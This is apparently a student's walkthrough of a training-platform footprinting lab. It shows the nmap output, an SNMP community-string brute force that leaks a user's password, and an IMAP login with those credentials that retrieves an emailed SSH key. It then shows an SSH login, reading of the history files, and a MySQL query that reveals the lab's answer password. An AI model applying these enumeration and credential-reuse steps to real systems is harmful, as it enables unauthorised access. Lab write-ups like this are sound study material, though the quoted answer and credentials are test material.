# Section 21: Footprinting Lab - Hard

Module: 04. Footprinting

---

## NMAP Emuneration
```bash
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Issuer: commonName=NIXHARD
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T01:30:25
| Not valid after:  2031-11-08T01:30:25
| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING CAPA STLS USER AUTH-RESP-CODE UIDL RESP-CODES SASL(PLAIN) TOP
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Issuer: commonName=NIXHARD
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T01:30:25
| Not valid after:  2031-11-08T01:30:25
| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
|_imap-capabilities: more have post-login SASL-IR listed OK capabilities LOGIN-REFERRALS AUTH=PLAINA0001 Pre-login ID ENABLE STARTTLS IMAP4rev1 IDLE LITERAL+
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more have post-login listed OK capabilities LOGIN-REFERRALS AUTH=PLAINA0001 Pre-login ID ENABLE SASL-IR IMAP4rev1 IDLE LITERAL+
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Issuer: commonName=NIXHARD
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T01:30:25
| Not valid after:  2031-11-08T01:30:25
| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) USER UIDL CAPA RESP-CODES AUTH-RESP-CODE TOP
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Issuer: commonName=NIXHARD
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-10T01:30:25
| Not valid after:  2031-11-08T01:30:25
| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Since these services all required credentials, therefore I have to emunerate the UDP ports:
```bash

```
## SNMP Emuneration
Since doesn't know the community public string:
```bash
┌──(jameskaois㉿kali)-[~]
└─$ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.136.136
Scanning 1 hosts, 3219 communities
10.129.136.136 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```
Found `backup`:
```
┌──(jameskaois㉿kali)-[~]
└─$ snmpwalk -v2c -c backup 10.129.136.136
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[Aiso.3.6.1.2.1.1.3.0 = Timeticks: (343292) 0:57:12.92
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (347496) 0:57:54.96
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 07 19 03 19 0C 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 158
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
```
Found a likely credentials: `tom NMds732Js2761`
## IMAP Emuneration
Use the captured credentials to login IMAP and got the SSH key:
```bash
┌──(jameskaois㉿kali)-[~]
└─$ openssl s_client -connect 10.129.136.136:imaps   
Connecting to 10.129.136.136
CONNECTED(00000003)
# ...
a login tom NMds732Js2761
a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
a list "" "*"
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
a OK List completed (0.006 + 0.000 + 0.006 secs).
a select INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
a OK [READ-WRITE] Select completed (0.004 + 0.000 + 0.003 secs).
a search ALL
* SEARCH 1
a OK Search completed (0.001 + 0.000 secs).
a fetch 1 BODY[]
* 1 FETCH (BODY[] {3661}
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
# ...
-----END OPENSSH PRIVATE KEY-----
)
a OK Fetch completed (0.025 + 0.000 + 0.024 secs).
```
## SSH to the machine
Using the SSH key to SSH as `tom`:
```bash
tom@NIXHARD:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
select\040*\040from\040users;
use\040users;
select\040*\040from\040users;
show\040databases;
use\040users;
select\040*\040from\040users;
tom@NIXHARD:~$ cat .bash_history 
mysql -u tom -p
ssh-keygen -t rsa -b 4096
ls
ls -al
cd .ssh/
ls
cd mail/
ls
ls -al
cd .imap/
ls
cd Important/
ls
set term=xterm
vim key
cat ~/.ssh/id_rsa
vim key
ls
mv key ..
cd ..
ls
mv key Important/
mv Important/key ../
cd ..
ls
ls -l
id
cat /etc/passwd
ls
cd mail/
ls
ls -al
cd mail/
ls
rm Meetings 
rm TESTING Important 
ls -l
cd ..
ls -al
mv mail/key Maildir/.Important/new/
mv Maildir/.Important/new/key Maildir/new/
cd Maildir/new/
ls
cd ..
tree .
cat cur/key
cd cur/
ls
ls -al
cat "key:2,"
mysql -u tom -p 
mysql -u tom -p
tom@NIXHARD:~$ 
```
Previous command include `mysql -u tom -p`, use the same way to see if we can access to the MySQL database:
```bash
tom@NIXHARD:~$ mysql -u tom -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.02 sec)

mysql> use users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
```
Then:
```bash
mysql> SELECT * FROM users WHERE username = "HTB";
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.00 sec)
```
---

[Back to Module Index](./README.md)
